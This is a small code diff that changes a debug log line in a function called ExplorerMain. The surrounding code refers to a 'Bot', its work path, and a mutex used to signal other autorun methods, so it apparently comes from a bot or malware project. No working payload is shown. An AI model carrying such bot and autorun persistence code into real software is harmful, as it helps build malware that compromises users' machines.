@@ -228,7 +228,7 @@ void ExplorerMain()
 
 	MDBG("Main", "----------------- ExplorerMain -----------------");
 	MDBG("Main", "Appliation (PID:%d) %s", Bot->PID(), Bot->ApplicationName().t_str());
-	MDBG("Main", "WorkPath %s  WorkPathHash %d", BOT::GetWorkPath() ,BOT::GetWorkFolderHash());
+	MDBG("Main", "WorkPath %s", BOT::GetWorkPath());
 
 	// Создаем мьютекс запущенного бота для сигнализации другим 
 	// способам автозапуска.
